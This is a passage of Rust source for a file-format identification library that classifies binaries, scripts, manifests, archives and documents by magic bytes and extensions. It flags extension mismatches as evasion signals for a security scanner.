//! Fast file format identification by magic bytes, shebangs, and extensions.
//!
//! `fileid` identifies file formats using a three-stage pipeline:
//!
//! 1. **Content** — magic bytes and shebangs (first 256 bytes)
//! 2. **Filename/Extension** — well-known names and extension mapping
//! 3. **Heuristics** — lightweight pattern matching (first 2 KB, no tree-sitter)
//!
//! Content is trusted first. Extension is a fallback. If neither yields a result,
//! the file is unidentifiable and `detect` returns `None`.
//!
//! # Example
//!
//! ```
//! use filefacts::{FileId, FileType};
//!
//! let data = b"\x7fELF\x02\x01\x01\x00";
//! let id = FileId::from_bytes(data);
//! assert_eq!(id.file_type(), FileType::Elf);
//! ```

pub mod container;
mod ext;
mod heuristics;
mod magic;

pub use container::{ArchiveFormat, Compression, Container, container_of};

use std::path::Path;

use serde::Serialize;

/// Result of file-format identification.
///
/// `FileId` is the public face of file detection: it carries the
/// identified [`FileType`], the [`DetectionSource`] that determined it,
/// and a flag for cases where the file's extension disagrees with its
/// content. The detection pipeline never returns "unknown plus an
/// error" — failures collapse to [`FileType::Unknown`].
///
/// Access state through the accessor methods ([`Self::file_type`],
/// [`Self::source`], [`Self::extension_mismatch`]); the fields stay
/// crate-private so new state can be added without breaking
/// downstream consumers.
#[derive(Debug, Clone, Copy, Serialize)]
#[non_exhaustive]
pub struct FileId {
    pub(crate) file_type: FileType,
    pub(crate) source: DetectionSource,
    pub(crate) extension_mismatch: bool,
    /// When `extension_mismatch` holds, the type the *extension* implied
    /// (`None` when the extension is absent or unrecognized). Lets callers
    /// describe the mismatch as a content-group→extension-group transition
    /// without deciding, here, whether that transition is dangerous.
    pub(crate) mismatch_ext_type: Option<FileType>,
}

impl FileId {
    /// Identify a byte slice without reference to any filename.
    ///
    /// Equivalent to passing an empty path to [`Self::from_path_and_bytes`].
    /// Always succeeds; unidentifiable input is reported as
    /// `FileType::Unknown` rather than as an error.
    #[must_use]
    pub fn from_bytes(bytes: &[u8]) -> Self {
        Self::from_path_and_bytes(Path::new(""), bytes)
    }

    /// Identify a byte slice with the original filename / extension
    /// available. Extensions inform the result only as a tiebreaker —
    /// content always wins when magic bytes are conclusive.
    #[must_use]
    pub fn from_path_and_bytes(path: &Path, bytes: &[u8]) -> Self {
        match detect(path, bytes) {
            Some(d) => {
                // Apply benign carve-outs (AppleDouble sidecars, Android APK,
                // XHTML) so the reported mismatch is an evasion signal rather
                // than a known format convention. FreeBSD `.pkg` zstd is already
                // resolved as Consistent during detection.
                let mismatch =
                    d.extension_mismatch() && !is_benign_extension_mismatch(path, bytes, d);
                Self {
                    file_type: d.file_type,
                    source: d.source,
                    extension_mismatch: mismatch,
                    mismatch_ext_type: if mismatch { d.extension_type() } else { None },
                }
            }
            None => Self {
                file_type: FileType::Unknown,
                source: DetectionSource::Heuristic,
                extension_mismatch: false,
                mismatch_ext_type: None,
            },
        }
    }

    /// Construct a `FileId` for a caller-known type, bypassing the
    /// detection pipeline entirely.
    ///
    /// Use when the language is established by surrounding context that the
    /// bytes themselves don't carry: the inner body of an interpreter
    /// inline-code invocation (`python3 -c "<code>"`, `node -e '<code>'`)
    /// has no shebang, extension, or magic, so [`from_path_and_bytes`]
    /// would fall back to [`FileType::Unknown`] and skip source parsing.
    /// The reported [`source`](Self::source) is [`DetectionSource::Forced`];
    /// no extension comparison is made, so `extension_mismatch` is `false`.
    ///
    /// [`from_path_and_bytes`]: Self::from_path_and_bytes
    #[must_use]
    pub fn forced(file_type: FileType) -> Self {
        Self {
            file_type,
            source: DetectionSource::Forced,
            extension_mismatch: false,
            mismatch_ext_type: None,
        }
    }

    /// The identified file type.
    #[must_use]
    pub fn file_type(&self) -> FileType {
        self.file_type
    }

    /// How the type was determined.
    #[must_use]
    pub fn source(&self) -> DetectionSource {
        self.source
    }

    /// `true` when content-based detection disagrees with the file's
    /// extension. Useful as a low-friction evasion signal. Benign format
    /// conventions (AppleDouble sidecars, Android APK, XHTML, FreeBSD pkg)
    /// are excluded.
    #[must_use]
    pub fn extension_mismatch(&self) -> bool {
        self.extension_mismatch
    }

    /// When [`Self::extension_mismatch`] holds, the coarse
    /// `(content_group, extension_group)` transition — e.g. `("binary",
    /// "image")` for a PE named `.png`. The extension group is `"unknown"`
    /// when the extension is unrecognized (e.g. `.woff2` carrying a PE).
    ///
    /// This deliberately reports *what kind* of mismatch occurred and leaves
    /// the severity call to the consumer: a `.docx` named `.doc`
    /// (`document`→`document`) is mundane, while a PE named `.jpeg`
    /// (`binary`→`image`) is a masquerade. Returns `None` when there is no
    /// genuine mismatch.
    #[must_use]
    pub fn extension_mismatch_transition(&self) -> Option<(&'static str, &'static str)> {
        if !self.extension_mismatch {
            return None;
        }
        let content = file_group(self.file_type);
        let ext = self.mismatch_ext_type.map_or("unknown", file_group);
        Some((content, ext))
    }
}

/// Coarse content category for a [`FileType`], used to describe an
/// extension/content mismatch as a `content_group → extension_group`
/// transition. Kept exhaustive so a new [`FileType`] forces a category choice.
fn file_group(ft: FileType) -> &'static str {
    match ft {
        FileType::MachO
        | FileType::Elf
        | FileType::Pe
        | FileType::JavaClass
        | FileType::PythonBytecode
        | FileType::Beam
        | FileType::Wasm
        | FileType::Dex
        | FileType::StaticLib
        | FileType::Lnk
        | FileType::DosCom => "binary",
        // Interpreted scripting languages (cleave's `scripts` for-group).
        FileType::Shell
        | FileType::Batch
        | FileType::Jcl
        | FileType::Vbs
        | FileType::Python
        | FileType::JavaScript
        | FileType::Ruby
        | FileType::Php
        | FileType::Perl
        | FileType::Lua
        | FileType::PowerShell
        | FileType::AppleScript
        | FileType::Jsp
        | FileType::Asp
        | FileType::Cfml
        | FileType::Mirc
        | FileType::IrcII => "script",
        // Compiled / typed source languages (cleave's `source` for-group).
        FileType::TypeScript
        | FileType::Go
        | FileType::Rust
        | FileType::Java
        | FileType::C
        | FileType::CSharp
        | FileType::Swift
        | FileType::ObjectiveC
        | FileType::Groovy
        | FileType::Scala
        | FileType::Kotlin
        | FileType::Zig
        | FileType::Elixir
        | FileType::Clojure => "source",
        FileType::PackageJson
        | FileType::PackageLockJson
        | FileType::VsixManifest
        | FileType::ChromeManifest
        | FileType::CargoToml
        | FileType::PyProjectToml
        | FileType::ComposerJson
        | FileType::Json
        | FileType::Gyp
        | FileType::GithubActions
        | FileType::SystemdService
        | FileType::DesktopEntry
        | FileType::Xml
        | FileType::Yaml
        | FileType::PkgInfo
        | FileType::SrcInfo
        | FileType::Registry
        | FileType::GoMod
        | FileType::GoSum
        | FileType::CargoLock
        | FileType::RequirementsTxt
        | FileType::PoetryLock
        | FileType::PipfileLock
        | FileType::GemfileLock
        | FileType::ComposerLock
        | FileType::YarnLock
        | FileType::PnpmLock
        | FileType::Plist
        | FileType::Nib
        | FileType::Pbxproj
        | FileType::Cmake
        | FileType::Makefile
        | FileType::Dockerfile
        // A detection ruleset, not prose. A `.yar` renamed `.txt` is
        // config→text; it is not the same kind of file as a note.
        | FileType::Yara => "config",
        FileType::Jar
        | FileType::Zip
        | FileType::Tar
        | FileType::Cpio
        | FileType::TarGz
        | FileType::TarBz2
        | FileType::TarXz
        | FileType::TarZst
        | FileType::Gz
        | FileType::Bz2
        | FileType::Xz
        | FileType::Lzma
        | FileType::Zst
        | FileType::SevenZ
        | FileType::Rar
        | FileType::Deb
        | FileType::Rpm
        | FileType::PkgMacos
        | FileType::Dmg
        | FileType::Iso
        | FileType::Cab
        | FileType::Chm
        | FileType::Crx
        | FileType::Xpi
        | FileType::Whl
        | FileType::Gem
        | FileType::ApkAndroid
        | FileType::ApkAlpine
        | FileType::Npm
        | FileType::Crate
        | FileType::Conda
        | FileType::Egg
        | FileType::Nupkg
        | FileType::Ipa
        | FileType::Vsix
        | FileType::PkgFreebsd
        | FileType::PkgArch
        | FileType::PythonSdist
        | FileType::OciImage
        | FileType::Xbps
        | FileType::Snap
        | FileType::Flatpak
        | FileType::SquashFs
        | FileType::GentooBinpkg
        | FileType::Asar => "archive",
        FileType::Rtf
        | FileType::OleDoc
        | FileType::Ooxml
        | FileType::Pdf
        | FileType::Odf
        | FileType::PostScript => "document",
        // Installer packages share the OLE2/CFBF wire format with OleDoc but
        // are not documents — treat them as archive-class for mismatch
        // transitions (e.g. an MSI renamed `.doc` is archive→document).
        FileType::Msi => "archive",
        FileType::Jpeg
        | FileType::Png
        | FileType::Svg
        | FileType::Ico
        | FileType::Gif
        | FileType::Bmp
        | FileType::Webp => "image",
        // Audio and video are their own classes: a payload renamed from
        // `.wav` to `.png` is a real transition, not a benign refinement.
        FileType::Wav | FileType::Aiff | FileType::Mp3 => "audio",
        FileType::Mp4 => "video",
        // Fonts are their own class, not images: a font renamed to `.png`
        // is a format transition worth reporting, not a benign refinement.
        FileType::Font => "font",
        FileType::Html | FileType::Markdown | FileType::Text | FileType::Tex => "text",
        FileType::Pickle | FileType::PgpSignature | FileType::Data | FileType::Unknown => "data",
    }
}

/// File format identified by fileid.
///
/// Variants cover binary formats, source languages, package manifests, archives,
/// and document types. Manifest types (e.g. `PackageJson`, `CargoToml`) are included
/// because they require format-specific analysis despite being syntactically JSON/TOML.
// Serialization goes through the canonical [`FileType::label`] /
// [`FileType::from_label`] pair (see the `impl serde::*` below), not a derived
// `rename_all`. That label is the single nomenclature filefacts, cleave, and
// scan all share — keeping the serialized form and the report/routing label
// the same string instead of two near-identical vocabularies.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
#[non_exhaustive]
pub enum FileType {
    /// Mach-O binary (macOS/iOS executable or library)
    MachO,
    /// ELF binary (Linux/Unix executable or shared library)
    Elf,
    /// PE binary (Windows executable, DLL)
    Pe,
    /// Unix shell script (bash, sh, zsh, etc.)
    Shell,
    /// Windows batch file (.bat, .cmd)
    Batch,
    /// IBM z/OS Job Control Language batch script (.jcl)
    Jcl,
    /// VBScript source file (.vbs, .vbe, .wsf, .wsc)
    Vbs,
    /// Python source file (.py)
    Python,
    /// JavaScript source file (.js, .mjs, .cjs)
    JavaScript,
    /// TypeScript source file (.ts, .tsx)
    TypeScript,
    /// Go source file (.go)
    Go,
    /// Rust source file (.rs)
    Rust,
    /// Java source file (.java)
    Java,
    /// Compiled Java bytecode (.class)
    JavaClass,
    /// Python compiled bytecode (.pyc)
    PythonBytecode,
    /// Erlang/Elixir compiled BEAM bytecode (.beam; `FOR1`…`BEAM` IFF container)
    Beam,
    /// WebAssembly binary module (.wasm; `\0asm` magic + version). A portable
    /// bytecode payload — frequently a Go/TinyGo/Rust/Emscripten compile target
    /// loaded by a JS host. Routed through the generic analyzer so string
    /// extraction, entropy, and symbol-name traits fire on the embedded
    /// `syscall/js` imports, struct tags, and rodata.
    Wasm,
    /// Dalvik/ART executable bytecode (`dex\n035\0` and later versions).
    /// APKs carry this as `classes.dex`; a standalone `.dex` is the same
    /// format, not an APK. There is no competing popular "DEX" file type —
    /// the name is the format, not a platform qualifier.
    Dex,
    /// Java archive (.jar, .war, .ear)
    Jar,
    /// Ruby source file (.rb)
    Ruby,
    /// PHP source file (.php)
    Php,
    /// Perl source file (.pl, .pm)
    Perl,
    /// Lua source file (.lua)
    Lua,
    /// C# source file (.cs)
    CSharp,
    /// PowerShell script (.ps1, .psm1)
    PowerShell,
    /// Swift source file (.swift)
    Swift,
    /// Objective-C source file (.m, .mm)
    ObjectiveC,
    /// Groovy source file (.groovy)
    Groovy,
    /// Scala source file (.scala)
    Scala,
    /// Kotlin source file (.kt, .kts)
    Kotlin,
    /// Zig source file (.zig)
    Zig,
    /// Elixir source file (.ex, .exs)
    Elixir,
    /// Clojure / ClojureScript / EDN source (.clj, .cljs, .cljc, .cljr, .edn, .bb)
    Clojure,
    /// C source file (.c, .h)
    C,
    /// npm package.json manifest
    PackageJson,
    /// npm package-lock.json lockfile
    PackageLockJson,
    /// VSCode extension manifest (.vsixmanifest)
    VsixManifest,
    /// Chrome extension manifest.json
    ChromeManifest,
    /// Rust Cargo.toml manifest
    CargoToml,
    /// Rust Cargo.lock lockfile — pins every crate to an exact version + sha256.
    CargoLock,
    /// Python pip requirements file (requirements.txt) — `name==version` pins.
    RequirementsTxt,
    /// Python Poetry lockfile (poetry.lock) — resolved package set.
    PoetryLock,
    /// Python Pipenv lockfile (Pipfile.lock) — resolved package set with hashes.
    PipfileLock,
    /// Ruby Bundler lockfile (Gemfile.lock) — resolved gem set with versions.
    GemfileLock,
    /// PHP Composer lockfile (composer.lock) — resolved package set with dists.
    ComposerLock,
    /// Yarn lockfile (yarn.lock) — resolved npm package set with integrity.
    YarnLock,
    /// pnpm lockfile (pnpm-lock.yaml) — resolved npm package set with integrity.
    PnpmLock,
    /// Python pyproject.toml manifest
    PyProjectToml,
    /// PHP composer.json manifest
    ComposerJson,
    /// Generic JSON document (.json)
    Json,
    /// node-gyp build manifest (binding.gyp, .gyp, .gypi). JSON-shaped build
    /// config; its `<!(...)`/`<!@(...)` command-expansion runs arbitrary shell
    /// during `node-gyp configure` (npm runs this automatically on install of a
    /// package containing binding.gyp), a known supply-chain execution vector.
    Gyp,
    /// GitHub Actions workflow YAML
    GithubActions,
    /// systemd service unit file (.service, .service.d/*.conf)
    SystemdService,
    /// freedesktop.org Desktop Entry (.desktop) - XDG application launcher / autostart
    DesktopEntry,
    /// Generic XML document (.xml, MSBuild .csproj, SVG, XML config files, etc.)
    Xml,
    /// Generic YAML document (.yaml, .yml) that is not one of the specific
    /// manifests above (a GitHub Actions workflow, a pnpm lockfile). YAML is the
    /// default configuration language for CI, Kubernetes and model cards, so an
    /// unrecognized one is worth naming rather than leaving as `unknown`.
    Yaml,
    /// Python package metadata (PKG-INFO, METADATA)
    PkgInfo,
    /// Arch/AUR generated package metadata (.SRCINFO) — normalized mirror of PKGBUILD
    SrcInfo,
    /// Normalized package-registry metadata (`*.registry.json`) — an upstream
    /// provider's account of a release (publish date, author, downloads,
    /// rating, deprecation), the serialized form of [`crate::Registry`].
    Registry,
    /// Go module manifest (go.mod) — `require` directives are declared dependencies.
    GoMod,
    /// Go module checksum database (go.sum) — pins every module to an `h1:` hash.
    GoSum,
    /// ZIP archive (zip, apk, ipa, nupkg, etc.)
    Zip,
    /// TAR archive (plain, no compression)
    Tar,
    /// ASCII CPIO archive (odc, newc, or newc checksum layout).
    Cpio,
    /// Gzip-compressed TAR (.tar.gz, .tgz, .crate)
    TarGz,
    /// Bzip2-compressed TAR (.tar.bz2, .tbz2)
    TarBz2,
    /// XZ-compressed TAR (.tar.xz, .txz)
    TarXz,
    /// Zstandard-compressed TAR (.tar.zst, .xbps)
    TarZst,
    /// Gzip-compressed single file (.gz, not a tar)
    Gz,
    /// Bzip2-compressed single file (.bz2, not a tar)
    Bz2,
    /// XZ-compressed single file (.xz, not a tar)
    Xz,
    /// LZMA-alone compressed single file (.lzma)
    Lzma,
    /// Zstandard-compressed single file (.zst, not a tar)
    Zst,
    /// 7-Zip archive (.7z)
    SevenZ,
    /// RAR archive (.rar)
    Rar,
    /// Debian package (.deb)
    Deb,
    /// Unix static library (.a) — an `ar` archive of relocatable object files.
    /// Shares the `!<arch>` magic with `.deb`; distinguished by the first `ar`
    /// member (`.deb` leads with `debian-binary`, a static library does not).
    StaticLib,
    /// RPM package (.rpm)
    Rpm,
    /// macOS installer package (.pkg, XAR format). Named `PkgMacos` (not bare
    /// `Pkg`) because the `.pkg` extension is ambiguous: FreeBSD and Arch also
    /// use it for compressed-tar packages, disambiguated by container magic.
    PkgMacos,
    /// Apple Disk Image (.dmg, UDIF container).
    Dmg,
    /// Optical-disc image (.iso): ISO 9660 and/or UDF filesystem — full OS
    /// install media. Identified by the volume-descriptor magic at sector 16;
    /// unpacked downstream by 7-Zip (ISO 9660, Joliet, Rock Ridge, and UDF).
    Iso,
    /// SquashFS read-only filesystem image — `hsqs` (little-endian) or `sqsh`
    /// (big-endian) superblock magic. Ships inside firmware images and appliance
    /// builds, and is the wire format of a Snap package (see [`FileType::Snap`]).
    SquashFs,
    /// Cabinet archive (.cab)
    Cab,
    /// Compiled HTML Help (.chm) — Microsoft ITSF/ITOL container with
    /// LZX-compressed HTML topics. Common malware delivery vector.
    Chm,
    /// Chrome extension (.crx)
    Crx,
    /// Mozilla Firefox extension (.xpi) — ZIP container with WebExtension or
    /// legacy XUL layout. Disambiguated from generic ZIP so the XPI-specific
    /// signing-scheme shape (`META-INF/mozilla.*`, `META-INF/cose.*`) can be
    /// surfaced.
    Xpi,
    /// Python wheel (.whl) — ZIP container with PEP 427 layout. Distinct
    /// from generic ZIP so the wheel-specific surface (dist-info, RECORD,
    /// native-extension count, top-level packages) can be extracted.
    Whl,
    /// RubyGems package (.gem) — uncompressed `ustar` tar holding
    /// `metadata.gz` (gzipped `Gem::Specification` YAML), `data.tar.gz`, and
    /// `checksums.yaml.gz`. Distinct from generic tar so the gem's external
    /// identity metadata can be surfaced as `gem.*`.
    Gem,
    /// Android application package (.apk) — ZIP container (`AndroidManifest.xml`,
    /// `classes.dex`). Disambiguated from the Alpine `.apk` by container magic
    /// (`PK` zip vs gzip tar) so each ecosystem gets its own model.
    ApkAndroid,
    /// Alpine Linux package (.apk) — gzip-concatenated tar (signature ‖ control
    /// ‖ data) carrying `.PKGINFO`. Disambiguated from the Android `.apk` by
    /// container magic (gzip vs `PK` zip).
    ApkAlpine,
    /// npm package (.tgz) — gzip tar with everything under a `package/` prefix
    /// (`package/package.json`). Disambiguated from a generic gzip tar by that
    /// marker, so npm supply-chain signal (install scripts, bin shims) routes
    /// to its own model.
    Npm,
    /// Rust crate (.crate) — gzip tar laid out as `<name>-<version>/` with a
    /// `Cargo.toml` at its root. The `.crate` extension is cargo-specific.
    Crate,
    /// conda package (.conda) — ZIP holding `metadata.json` plus zstd-compressed
    /// `info-*`/`pkg-*` tars. Distinct from generic ZIP so conda identity
    /// (`info/index.json`) routes to its own model.
    Conda,
    /// Python egg (.egg) — ZIP with an `EGG-INFO/` directory (`PKG-INFO`).
    Egg,
    /// NuGet package (.nupkg) — ZIP carrying a `*.nuspec` manifest.
    Nupkg,
    /// iOS application archive (.ipa) — ZIP with `Payload/*.app/Info.plist`.
    Ipa,
    /// VS Code / Open VSX extension (.vsix) — ZIP carrying
    /// `extension.vsixmanifest`. Distinct from the manifest file type
    /// [`FileType::VsixManifest`], which is that inner XML alone.
    Vsix,
    /// FreeBSD package (.pkg) — zstd-compressed tar whose first member is the
    /// `+COMPACT_MANIFEST` / `+MANIFEST` metadata. Disambiguated from the macOS
    /// `.pkg` by container magic (zstd-tar vs `xar!`) and from Arch by the
    /// `+MANIFEST` marker.
    PkgFreebsd,
    /// Arch Linux package (.pkg.tar.{zst,xz,gz}) — compressed tar whose first
    /// member is `.PKGINFO`. Disambiguated from FreeBSD by that marker; the
    /// `.pkg.tar.*` extension is Arch-specific where the body can't be read.
    PkgArch,
    /// Python source distribution (sdist) — gzip tar laid out as
    /// `<name>-<version>/` with a `PKG-INFO` metadata file at its root.
    /// Disambiguated from a generic gzip tar by that marker, so the PyPI
    /// publisher identity (`python.*`) routes to its own model.
    PythonSdist,
    /// OCI / Docker container image archive — an (uncompressed) tar carrying
    /// either an OCI `oci-layout` + `index.json` or a `docker save`
    /// `manifest.json`. Distinct from a generic tar so image refs and content
    /// digests can be surfaced as `oci.*`.
    OciImage,
    /// Void Linux package (.xbps) — zstd-compressed tar carrying `props.plist`
    /// metadata. Distinguished from a generic `.tar.zst` by its extension.
    Xbps,
    /// Ubuntu Snap package (.snap) — a SquashFS image carrying `meta/snap.yaml`.
    /// Distinguished from a bare [`FileType::SquashFs`] image by its extension,
    /// which is the only signal available without reading the filesystem.
    Snap,
    /// Flatpak single-file bundle (.flatpak) — an OSTree static delta in GVariant
    /// framing. Unlike every other package format here it carries no magic at a
    /// fixed offset and none is registered with `file(1)`, so the extension is
    /// the identification.
    Flatpak,
    /// Gentoo binary package (GLEP 78 `.gpkg.tar`) — an uncompressed tar
    /// bundling `metadata.tar.*`, `image.tar.*`, and a `Manifest`. Distinct
    /// from a generic tar by its `.gpkg.tar` extension.
    GentooBinpkg,
    /// Electron ASAR application archive (.asar)
    Asar,
    /// AppleScript source file (.applescript, .scpt)
    AppleScript,
    /// Apple Property List (.plist)
    Plist,
    /// Compiled Interface Builder archive (.nib): the object graph AppKit or
    /// UIKit instantiates for a window or view, in either the `NIBArchive`
    /// layout or an `NSKeyedArchiver` binary plist. Distinct from `Plist`
    /// because the graph names the app's own classes, action selectors,
    /// and Swift modules, which is attribution a plain plist never carries.
    Nib,
    /// Xcode project file (`project.pbxproj`) — an OpenStep-style property
    /// list describing targets, build phases, and build settings. Kept
    /// distinct from `Plist` because it is the only plist dialect that carries
    /// executable build scripts, which is what makes it a supply-chain target.
    Pbxproj,
    /// CMake build script (`CMakeLists.txt`, `*.cmake`). Its own type rather
    /// than generic text because it is executable build logic — `execute_process`
    /// and `add_custom_command` run at configure and build time — so rules that
    /// target build systems must be able to name it.
    Cmake,
    /// Rich Text Format document (.rtf)
    Rtf,
    /// Legacy Microsoft Office document (OLE2/CFBF: .doc, .xls, .ppt, .msg)
    OleDoc,
    /// Windows Installer package / patch (OLE2/CFBF: .msi, .msp). Same compound
    /// container as [`OleDoc`](Self::OleDoc), but a distinct product surface (installer tables,
    /// custom-action binaries, SummaryInformation) — not a document.
    Msi,
    /// Modern Microsoft Office document (OOXML: .docx, .xlsx, .pptx)
    Ooxml,
    /// Windows Shell Link file (.lnk)
    Lnk,
    /// JPEG image
    Jpeg,
    /// PNG image
    Png,
    /// RIFF audio (`.wav`). Chunked container; see formats/containers.rs.
    Wav,
    /// IFF audio (`.aiff`, `.aifc`).
    Aiff,
    /// MPEG audio with optional ID3 tags (`.mp3`).
    Mp3,
    /// ISO base media (`.mp4`, `.m4a`, `.mov`) — a flat box sequence.
    Mp4,
    /// Windows icon or cursor (`.ico`, `.cur`). The favicon every web package
    /// ships and nobody opens, which is what makes it a carrier.
    Ico,
    /// GIF image (`.gif`).
    Gif,
    /// Windows bitmap (`.bmp`).
    Bmp,
    /// RIFF image (`.webp`).
    Webp,
    /// Font container: sfnt (`.ttf`/`.otf`/`.ttc`), WOFF, WOFF2, or EOT.
    /// One variant for the family because the abuse patterns are shared —
    /// a payload wearing a font name, or a stowaway in the table gaps —
    /// and the concrete container is reported as `font.format`.
    Font,
    /// SVG image (.svg) — XML-based vector graphic. Unlike raster images it
    /// is text and can embed `<script>` / event handlers, making it a common
    /// phishing/HTML-smuggling carrier; classified as media but scanned as XML.
    Svg,
    /// Python pickle serialized data (.pkl, .pickle, .joblib)
    Pickle,
    /// PDF document
    Pdf,
    /// HTML document (.html, .htm)
    Html,
    /// JavaServer Pages (`.jsp`, `.jspx`). The page directive is unique to JSP.
    Jsp,
    /// Classic ASP and ASP.NET (`.asp`, `.aspx`, and the related suffixes).
    Asp,
    /// ColdFusion Markup Language (`.cfm`, `.cfc`, `.cfml`).
    Cfml,
    /// TeX or LaTeX source (`.tex`, `.sty`, `.ltx`, `.dtx`). `.cls` is shared
    /// with Visual Basic, so a class file is TeX only when its body says so.
    Tex,
    /// YARA rule source (`.yar`, `.yara`).
    Yara,
    /// PostScript or EPS (`.ps`, `.eps`).
    PostScript,
    /// DOS COM executable. No header of its own; `INT 21h` (`CD 21`) is the syscall.
    DosCom,
    /// mIRC script (`.mrc`).
    Mirc,
    /// ircII or EPIC script. The `^on` / `^alias` hook syntax is the mark.
    IrcII,
    /// Markdown document (.md, .markdown)
    Markdown,
    /// Makefile / GNU Make build file
    Makefile,
    /// Dockerfile — container image build definition
    Dockerfile,
    /// OpenDocument Format (.odt, .ods, .odp, .odg) — ZIP-based office documents
    Odf,
    /// OpenPGP signature (.sig, .asc) — the detached signature published beside
    /// a release artifact. Both the ASCII-armored and binary packet forms.
    /// Provenance evidence rather than payload, and named so a release directory
    /// does not read as a pile of unknowns.
    PgpSignature,
    /// Plain text data (.txt, .text, or printable text with no stronger type)
    Text,
    /// Opaque or sidecar data (.dat, .bin, .payload, .raw, and .map) — commonly carries
    /// encrypted/XOR-d payloads or source-map embedded code. Routed through the generic analyzer
    /// so string extraction, entropy, and encoded-payload detection still fire.
    Data,
    /// File type could not be determined
    Unknown,
}

impl FileType {
    /// Returns true if this file type represents executable code (binaries, scripts,
    /// manifests, archives, or document formats that can carry exploits).
    #[must_use]
    pub fn is_program(&self) -> bool {
        !matches!(
            self,
            Self::Unknown | Self::Html | Self::Markdown | Self::Odf
        )
    }

    /// Returns true if this file type is an archive or compressed container.
    #[must_use]
    pub fn is_archive(&self) -> bool {
        matches!(
            self,
            Self::Zip
                | Self::Tar
                | Self::Cpio
                | Self::TarGz
                | Self::TarBz2
                | Self::TarXz
                | Self::TarZst
                | Self::Gz
                | Self::Bz2
                | Self::Xz
                | Self::Lzma
                | Self::Zst
                | Self::SevenZ
                | Self::Rar
                | Self::Deb
                | Self::Rpm
                | Self::PkgMacos
                | Self::Dmg
                | Self::Iso
                | Self::Cab
                | Self::Chm
                | Self::Crx
                | Self::Xpi
                | Self::Whl
                | Self::Gem
                | Self::ApkAndroid
                | Self::ApkAlpine
                | Self::Npm
                | Self::Crate
                | Self::Conda
                | Self::Egg
                | Self::Nupkg
                | Self::Ipa
                | Self::Vsix
                | Self::PkgFreebsd
                | Self::PkgArch
                | Self::PythonSdist
                | Self::OciImage
                | Self::Xbps
                | Self::GentooBinpkg
                | Self::Asar
                | Self::Jar
        )
    }

    /// Returns true if this file type is a compiled native binary.
    #[must_use]
    pub fn is_binary(&self) -> bool {
        matches!(
            self,
            Self::Elf
                | Self::Pe
                | Self::MachO
                | Self::JavaClass
                | Self::PythonBytecode
                | Self::Beam
                | Self::Wasm
                | Self::Dex
                | Self::DosCom
        )
    }

    /// Returns true if cleave supports analysis of this file type.
    /// All currently identified types are supported; this is future-proofing.
    #[must_use]
    pub fn is_supported(&self) -> bool {
        self.is_program()
    }

    /// Returns true if this file type represents source code with AST support.
    #[must_use]
    pub fn is_source_code(&self) -> bool {
        matches!(
            self,
            Self::Python
                | Self::Ruby
                | Self::JavaScript
                | Self::TypeScript
                | Self::Php
                | Self::Perl
                | Self::Lua
                | Self::CSharp
                | Self::C
                | Self::Rust
                | Self::Shell
                | Self::PowerShell
                | Self::Kotlin
                | Self::Java
                | Self::Go
                | Self::Swift
                | Self::ObjectiveC
                | Self::Groovy
                | Self::Scala
                | Self::Zig
                | Self::Elixir
        )
    }

    /// Returns true for structured-manifest formats whose entire content is
    /// parsed into the `values` tree (JSON/TOML/YAML manifests, plist, etc.).
    ///
    /// For these, the structured view *is* the content surface, so the
    /// `strings(1)`-tier byte scan is suppressed — re-scanning the same bytes
    /// would only duplicate the parsed tree as noise. This covers only the
    /// named formats that are always fully parsed; generic `Json`/`Gyp` are
    /// size-limited and intentionally fall back to a text scan when skipped.
    #[must_use]
    pub fn is_structured_data(&self) -> bool {
        matches!(
            self,
            Self::PackageJson
                | Self::PackageLockJson
                | Self::ComposerJson
                | Self::ChromeManifest
                | Self::CargoToml
                | Self::CargoLock
                | Self::PoetryLock
                | Self::PipfileLock
                | Self::ComposerLock
                | Self::PnpmLock
                | Self::PyProjectToml
                | Self::GithubActions
                | Self::Plist
                | Self::Nib
                | Self::Pbxproj
                | Self::PkgInfo
                | Self::SrcInfo
                | Self::Registry
        )
    }

    /// The canonical, stable label for this type — the single nomenclature
    /// shared by filefacts, cleave (its report `type` field), and scan (its
    /// routing keys). It is also the serialized form (see the `serde` impls).
    ///
    /// The scheme: lowercase throughout; multi-word descriptive types use
    /// `snake_case`; archive container+compression pairs use the real dotted
    /// suffix (`tar.gz`); types that *are* a fixed filename use that filename
    /// (`go.mod`, `package-lock.json`); and universally known short names stay
    /// short (`elf`, `pe`, `macho`). [`FileType::from_label`] is the inverse.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            // Native binaries / bytecode.
            Self::MachO => "macho",
            Self::Elf => "elf",
            Self::Pe => "pe",
            Self::JavaClass => "java_class",
            Self::PythonBytecode => "python_bytecode",
            Self::Beam => "beam",
            Self::Wasm => "wasm",
            Self::Dex => "dex",
            // Source / scripts.
            Self::Shell => "shell",
            Self::Batch => "batch",
            Self::Jcl => "jcl",
            Self::Vbs => "vbs",
            Self::Python => "python",
            Self::JavaScript => "javascript",
            Self::TypeScript => "typescript",
            Self::Go => "go",
            Self::Rust => "rust",
            Self::Java => "java",
            Self::Ruby => "ruby",
            Self::Php => "php",
            Self::Perl => "perl",
            Self::Lua => "lua",
            Self::CSharp => "csharp",
            Self::PowerShell => "powershell",
            Self::Swift => "swift",
            Self::ObjectiveC => "objective_c",
            Self::Groovy => "groovy",
            Self::Scala => "scala",
            Self::Kotlin => "kotlin",
            Self::Zig => "zig",
            Self::Elixir => "elixir",
            Self::Clojure => "clojure",
            Self::C => "c",
            Self::AppleScript => "applescript",
            Self::Makefile => "makefile",
            Self::Dockerfile => "dockerfile",
            // Manifests / lockfiles — fixed filenames keep their filename;
            // descriptive ones are snake_case.
            Self::PackageJson => "package.json",
            Self::PackageLockJson => "package-lock.json",
            Self::ComposerJson => "composer.json",
            Self::ComposerLock => "composer.lock",
            Self::CargoToml => "cargo.toml",
            Self::CargoLock => "cargo.lock",
            Self::PyProjectToml => "pyproject.toml",
            Self::RequirementsTxt => "requirements.txt",
            Self::PoetryLock => "poetry.lock",
            Self::PipfileLock => "pipfile.lock",
            Self::GemfileLock => "gemfile.lock",
            Self::YarnLock => "yarn.lock",
            Self::PnpmLock => "pnpm-lock.yaml",
            Self::GoMod => "go.mod",
            Self::GoSum => "go.sum",
            Self::Gyp => "gyp",
            Self::GithubActions => "github_actions",
            Self::SystemdService => "systemd_service",
            Self::DesktopEntry => "desktop_entry",
            Self::PkgInfo => "pkg_info",
            Self::SrcInfo => "src_info",
            Self::VsixManifest => "vsix_manifest",
            Self::ChromeManifest => "chrome_manifest",
            Self::Registry => "registry",
